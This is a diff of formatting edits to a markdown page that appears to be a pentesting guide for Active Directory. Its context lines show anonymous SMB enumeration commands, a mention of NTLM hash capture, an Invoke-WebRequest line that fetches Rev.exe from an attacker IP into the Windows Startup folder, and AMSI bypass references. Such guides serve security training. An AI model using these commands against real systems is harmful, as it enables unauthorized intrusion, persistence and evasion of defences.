@@ -71,7 +71,7 @@ If you just have access to an AD environment but you don't have any credentials/
 **for old versions of windows, probably wont find it anymore.**
 {% endhint %}
 
-```shell
+```powershell
 enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
 
 smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
@@ -158,7 +158,7 @@ Find-InterestingDomainShareFile -Include *passwords*
 
 When connecting a computer to most enterprise networks, if the Dynamic Host Configuration Protocol (DHCP) is enabled, it will assign an IP address to that computer, and send a lot of information. Nameservers and domain names are usually set through DHCP offer packets. On UNIX-like systems, the /etc/resolv.conf file will store information for name resolution operations after the DHCP offer.
 
-```shell
+```shell-session
 nmap --script broadcast-dhcp-discover
 ```
 
@@ -174,11 +174,9 @@ In many cases, there will be MAC address filtering, static IP addressing, VLANs 
 
 MS-RPC (Microsoft Remote Procedure Call) is a protocol that allows requesting service from a program on another computer without having to understand the details of that computer's network. An MS-RPC service can be accessed through different transport protocols, among which:
 
-#### . a network SMB pipe (listening ports are 139 & 445)&#x20;
-
-#### . plain TCP or plain UDP (listening port set at the service creation)&#x20;
-
-#### . a local SMB pipe
+* <mark style="color:green;">a network SMB pipe (listening ports are 139 & 445)</mark>&#x20;
+* <mark style="color:green;">plain TCP or plain UDP (listening port set at the service creation)</mark>&#x20;
+* &#x20;<mark style="color:green;">a local SMB pipe</mark>
 
 RPC services over an SMB transport, i.e. port 445/TCP, are reachable through "named pipes"' (through the `IPC$` share). There are many interesting named pipes that allow various operations from NULL sessions context, to local administrative context.
 
@@ -274,9 +272,9 @@ nmblookup -A $IPAdress
 The oldest and still, most effective technique is service spoofing and capturing NTLM hashes.
 {% endhint %}
 
-**Assuming that you are conected to the internal network (part of the domain) but dont have access to any system in the domain.**
+**Assuming that you are connected to the internal network (part of the domain) but don't have access to any system in the domain.**
 
-#### **check out** [**MITM**](broken-reference)  **Section for a full list of these attacks.**
+#### <mark style="color:green;">check out</mark> [_<mark style="color:green;">MITM</mark>_](broken-reference) _<mark style="color:green;"></mark>_ <mark style="color:green;"></mark> <mark style="color:green;"></mark><mark style="color:green;">Section for a full list of these attacks.</mark>
 
 ## <mark style="color:red;">Exploitation with Credentials</mark>
 
@@ -284,7 +282,7 @@ The oldest and still, most effective technique is service spoofing and capturing
 After capturing the hashes, we can get out initial access to one of the joined systems and move up to DC.
 {% endhint %}
 
-#### Check [crackmapexec](broken-reference) and [Impacket ](broken-reference)sections.
+#### <mark style="color:green;">Check</mark> [_<mark style="color:green;">crackmapexec</mark>_](broken-reference) <mark style="color:green;">and</mark> [_<mark style="color:green;">Impacket</mark>_ ](broken-reference)<mark style="color:green;">sections.</mark>
 
 ## <mark style="color:red;">Load scripts in Memory</mark>
 
@@ -320,7 +318,7 @@ In some cases windows defender will be triggered if you try to load scripts from
 Invoke-WebRequest "http://10.10.16.7/Rev.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe"
 ```
 
-#### for more file transfer techniques, check out [this section](broken-reference).
+#### <mark style="color:green;">for more file transfer techniques, check out</mark> [_<mark style="color:green;">this section</mark>_](broken-reference)<mark style="color:green;">.</mark>
 
 ### <mark style="color:orange;">Bypass AMSI</mark>
 
@@ -346,7 +344,7 @@ Another bypass, which is not detected by PowerShell autologging:
 
 {% embed url="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" %}
 
-#### For more info about AMSI refer to the [AMSI bypass](broken-reference) in AV Evasion.
+#### <mark style="color:green;">For more info about AMSI refer to the</mark> <mark style="color:green;"></mark>_<mark style="color:green;"></mark>_ [_<mark style="color:green;">**AMSI bypass**</mark>_](broken-reference) <mark style="color:green;">in AV Evasion.</mark>
 
 ## <mark style="color:red;">Loading Enumeration Tools</mark>
 
